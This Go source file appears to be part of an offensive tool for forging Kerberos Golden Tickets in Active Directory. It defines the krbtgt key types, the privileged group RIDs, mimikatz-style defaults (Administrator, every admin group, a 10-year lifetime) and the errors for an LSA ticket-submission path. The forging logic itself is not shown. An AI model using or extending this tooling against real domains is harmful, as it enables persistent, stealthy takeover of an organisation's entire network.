package goldenticket

import (
	"errors"
	"time"
)

// EType is the etype of the krbtgt key used to sign the forged
// ticket. RC4 is universally accepted but flagged as weak by modern
// AD policies; AES256 matches Windows 10+/Server 2016+ defaults.
type EType int

const (
	// ETypeRC4HMAC corresponds to RFC 4757 (etype 23). Hash bytes
	// are the 16-byte NTLM hash.
	ETypeRC4HMAC EType = 23
	// ETypeAES128CTS corresponds to RFC 3962 (etype 17). Hash
	// bytes are the 16-byte AES128 long-term key derived from the
	// krbtgt password + salt.
	ETypeAES128CTS EType = 17
	// ETypeAES256CTS corresponds to RFC 3962 (etype 18). Hash
	// bytes are the 32-byte AES256 long-term key.
	ETypeAES256CTS EType = 18
)

// String returns the canonical IANA name of the etype.
func (e EType) String() string {
	switch e {
	case ETypeRC4HMAC:
		return "rc4-hmac"
	case ETypeAES128CTS:
		return "aes128-cts-hmac-sha1-96"
	case ETypeAES256CTS:
		return "aes256-cts-hmac-sha1-96"
	default:
		return "etype-unknown"
	}
}

// keyLen returns the expected number of key bytes for this etype.
// Used by Params.validate to reject mismatched hash lengths.
func (e EType) keyLen() int {
	switch e {
	case ETypeRC4HMAC, ETypeAES128CTS:
		return 16
	case ETypeAES256CTS:
		return 32
	default:
		return 0
	}
}

// Hash carries the krbtgt long-term key used to sign the forged TGT.
// The Type determines how the key is interpreted and which etype is
// stamped on the resulting ticket.
type Hash struct {
	Type  EType
	Bytes []byte
}

// Common Active Directory group RIDs. Default group set for forged
// administrative tickets covers the canonical "domain god" stack.
const (
	RIDDomainAdmins      uint32 = 512
	RIDDomainUsers       uint32 = 513
	RIDDomainComputers   uint32 = 515
	RIDDomainControllers uint32 = 516
	RIDSchemaAdmins      uint32 = 518
	RIDEnterpriseAdmins  uint32 = 519
	RIDGroupPolicyAdmins uint32 = 520
)

// DefaultAdminGroups is the RID set mimikatz uses for `kerberos::golden`
// when the operator does not pass /groups. Equivalent to membership in
// every domain-wide privileged group.
var DefaultAdminGroups = []uint32{
	RIDDomainUsers,
	RIDDomainAdmins,
	RIDGroupPolicyAdmins,
	RIDSchemaAdmins,
	RIDEnterpriseAdmins,
}

// Params describes a Golden Ticket to forge. Defaults documented per
// field — Forge fills them in if zero/empty so callers can supply only
// what differs from the canonical "Administrator @ domain root with
// every admin group membership and a 10-year lifetime" recipe.
type Params struct {
	// Domain is the FQDN of the target Active Directory domain
	// (e.g. "corp.example.com"). Required.
	Domain string

	// DomainSID is the S-1-5-21-... prefix used by every account in
	// Domain. Required — combined with UserRID to form the user's
	// SID and with each Group RID to form the group SID. mimikatz
	// `lsadump::trust /patch` and `whoami /all` both surface this.
	DomainSID string

	// User is the sAMAccountName the forged ticket impersonates.
	// Default "Administrator".
	User string

	// UserRID is the relative identifier appended to DomainSID for
	// the impersonated user. Default 500 (built-in Administrator).
	UserRID uint32

	// Groups is the set of group RIDs the PAC will claim. Default
	// DefaultAdminGroups when nil/empty.
	Groups []uint32

	// Hash carries the krbtgt long-term key. Required.
	Hash Hash

	// PrincipalName is the SPN the ticket is for. Default
	// "krbtgt/<Domain uppercase>" — the standard "ticket-granting
	// ticket targets the krbtgt principal" form.
	PrincipalName string

	// Lifetime is the validity window starting at Now. Default
	// 10 years (the historical mimikatz default; well over any AD
	// policy ceiling — that's the *point*).
	Lifetime time.Duration

	// Now is the ticket issue time. Default time.Now() at Forge.
	// Exposed for deterministic golden-file tests; production
	// callers leave it zero.
	Now time.Time

	// LogonID is the locally unique LUID assigned to the synthetic
	// session. Default 0 (meaningful only when the ticket is later
	// submitted into a live LSA via Submit, which assigns its own).
	LogonID uint64
}

// Sentinel errors returned by Forge / Submit. Callers use errors.Is
// to dispatch; the wrapped %w chain carries the underlying detail.
var (
	// ErrInvalidParams fires when Params fails the pre-flight
	// validation (missing Domain/DomainSID, zero-length hash, hash
	// length not matching EType).
	ErrInvalidParams = errors.New("goldenticket: invalid Params")

	// ErrPACBuild wraps any failure inside the PAC marshaler — NDR
	// encoding error, unexpected struct size, signature placeholder
	// alignment.
	ErrPACBuild = errors.New("goldenticket: PAC build failed")

	// ErrTicketBuild wraps any failure inside the EncTicketPart /
	// KRB-CRED marshaler.
	ErrTicketBuild = errors.New("goldenticket: ticket build failed")

	// ErrSubmit fires from the Windows-only Submit when
	// LsaCallAuthenticationPackage returns non-success or when the
	// kirbi cannot be parsed back into a KERB_SUBMIT_TKT_REQUEST.
	// Linux callers see ErrPlatformUnsupported instead.
	ErrSubmit = errors.New("goldenticket: LsaCallAuthenticationPackage failed")

	// ErrPlatformUnsupported is returned by Submit on non-Windows
	// builds. The Forge entry point itself is cross-platform.
	ErrPlatformUnsupported = errors.New("goldenticket: Submit is Windows-only")
)
